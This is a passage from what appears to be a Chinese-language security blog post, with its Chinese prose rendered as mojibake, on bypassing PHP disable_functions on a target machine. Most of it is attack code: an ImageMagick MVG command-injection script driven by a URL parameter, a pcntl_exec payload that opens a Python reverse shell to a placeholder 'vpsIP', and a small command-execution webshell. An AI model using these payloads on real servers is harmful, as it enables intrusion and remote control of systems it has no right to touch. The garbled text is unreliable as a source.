<a href="https://imgtu.com/i/RWwy7T"><img src="https://z3.ax1x.com/2021/07/04/RWwy7T.md.png" alt="RWwy7T.md.png" loading="lazy"></a><br>
å‘ç°ç›´æ¥banæ‰æ‰€æœ‰å¯æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚</p>
<h1 id="0x03ç»•è¿‡disable_function">0x03ç»•è¿‡disable_function</h1>
<h2 id="imagemagickç»•è¿‡">ImageMagickç»•è¿‡</h2>
<pre><code class="language-php">&lt;?php
echo &quot;Disable Functions: &quot; . ini_get('disable_functions') . &quot;\n&quot;;
$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}
$command = $command . &quot;&gt;&quot; . SAE_TMP_PATH . &quot;/data&quot;;
$exploit = &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg&quot;|$command&quot;)'
pop graphic-context
EOF;

$path1 = SAE_TMP_PATH . &quot;KKKK.mvg&quot;;
$path2 = SAE_TMP_PATH . &quot;KKKK.png&quot;;
file_put_contents($path1, $exploit);
$thumb = new Imagick();
$thumb-&gt;readImage($path1);
$thumb-&gt;writeImage($path2);
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink(&quot;$path1&quot;);
unlink(&quot;$path2&quot;);
echo file_get_contents(SAE_TMP_PATH . &quot;/data&quot;);
?&gt;
</code></pre>
<p>base64ä»¥åä¼ ä¸Šå»ï¼Œå¯æƒœä¸è¡Œ<br>
<a href="https://imgtu.com/i/RWwcAU"><img src="https://z3.ax1x.com/2021/07/04/RWwcAU.md.png" alt="RWwcAU.md.png" loading="lazy"></a></p>
<h2 id="åˆ©ç”¨pcntl_execçªç ´disable_functions">åˆ©ç”¨pcntl_execçªç ´disable_functions</h2>
<p>pcntlæ˜¯linuxä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒphpçš„å¤šçº¿ç¨‹æ“ä½œã€‚(ä¸pythonç»“åˆåå¼¹shell) pcntl_execå‡½æ•°çš„ä½œç”¨æ˜¯åœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åºï¼Œç‰ˆæœ¬è¦æ±‚ï¼šPHP 4 &gt;= 4.2.0, PHP 5</p>
<pre><code class="language-php">&lt;?php  pcntl_exec(&quot;/usr/bin/python&quot;,array('-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;vpsIP&quot;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'));?&gt;
</code></pre>
<p>å®è´¨å°±æ˜¯åˆ©ç”¨phpå¼¹å‡ºPythonçš„shellï¼Œç”±äºé¶æœºæ˜¯linuxçš„ï¼Œpythonè‡ªå¸¦ã€‚<br>
<strong>so</strong><br>
base64åï¼Œä¸Šä¼ åé¡ºåˆ©è·å–shell<br>
<a href="https://imgtu.com/i/RWwsBV"><img src="https://z3.ax1x.com/2021/07/04/RWwsBV.md.png" alt="RWwsBV.md.png" loading="lazy"></a></p>
<h1 id="0x04-å‘½ä»¤æ‰§è¡Œ">0x04 å‘½ä»¤æ‰§è¡Œ</h1>
<p>å¦‚æœåªæƒ³ä¼ ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„é©¬ä¸Šå»çš„è¯<br>
èƒ½ç”¨pythonå°±ç”¨python,å‘½ä»¤ç»“æœå†™å…¥æ–‡ä»¶å³å¯ï¼Œæ³¨æ„åŒå¼•å·(è¸©å‘è®°å½•)</p>
<pre><code class="language-php">&lt;?php pcntl_exec( &quot;/usr/bin/python&quot;, array( '-c',
'import os;
os.system(&quot;pwd &gt;1.txt&quot; );')); ?&gt;
</code></pre>
]]></content>
    </entry>
</feed>